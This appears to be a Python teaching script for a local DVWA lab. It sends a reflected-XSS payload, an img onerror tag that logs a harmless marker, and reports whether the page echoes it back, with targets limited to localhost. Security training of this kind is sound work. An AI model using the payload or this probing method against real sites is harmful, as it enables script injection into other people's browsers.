#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""XSS-002 反射型 XSS 教学验证草案（仅限本地授权靶场，使用无害标记）。"""

import argparse
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}
DEFAULT_PAYLOAD = '<img src=x onerror="console.log(%s)">' % repr("LLM_LAB_XSS")


class NoRedirect(urllib.request.HTTPRedirectHandler):
    """拒绝自动跟随重定向，便于区分登录失效与目标页面。"""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def build_parser():
    parser = argparse.ArgumentParser(description="XSS-002 reflected XSS draft")
    parser.add_argument("--base-url", default="http://127.0.0.1/dvwa/vulnerabilities/xss_r/")
    parser.add_argument("--param", default="name")
    parser.add_argument("--payload", default=DEFAULT_PAYLOAD)
    parser.add_argument("--timeout", type=float, default=10.0)
    parser.add_argument("--cookie-file", default=None,
                        help="optional local file holding the Cookie header value; never printed")
    return parser


def validate_target(base_url):
    parts = urllib.parse.urlsplit(base_url)
    if parts.scheme not in ("http", "https"):
        raise SystemExit("unsupported scheme: %s" % parts.scheme)
    if (parts.hostname or "").lower() not in ALLOWED_HOSTS:
        raise SystemExit("host not allowed: %s" % parts.hostname)


def main():
    args = build_parser().parse_args()
    validate_target(args.base_url)
    query = urllib.parse.urlencode({args.param: args.payload})
    separator = "&" if urllib.parse.urlsplit(args.base_url).query else "?"
    url = args.base_url + separator + query
    request = urllib.request.Request(url, method="GET")
    request.add_header("User-Agent", "LLM-LAB-XSS-002-draft")
    if args.cookie_file:
        with open(args.cookie_file, "r", encoding="utf-8") as handle:
            request.add_header("Cookie", handle.read().strip())
    opener = urllib.request.build_opener(NoRedirect)
    try:
        with opener.open(request, timeout=args.timeout) as response:
            body = response.read().decode("utf-8", errors="replace")
            print("status:", response.getcode())
            print("content-type:", response.headers.get("Content-Type"))
            print("payload echoed verbatim:", args.payload in body)
            index = body.find(args.payload)
            if index >= 0:
                start = max(0, index - 40)
                print("echo context:", body[start:index + len(args.payload) + 40])
    except urllib.error.HTTPError as exc:
        print("HTTP error (possible login redirect/denial):", exc.code)
        return 2
    except urllib.error.URLError as exc:
        print("connection error:", exc.reason)
        return 3
    return 0


if __name__ == "__main__":
    sys.exit(main())
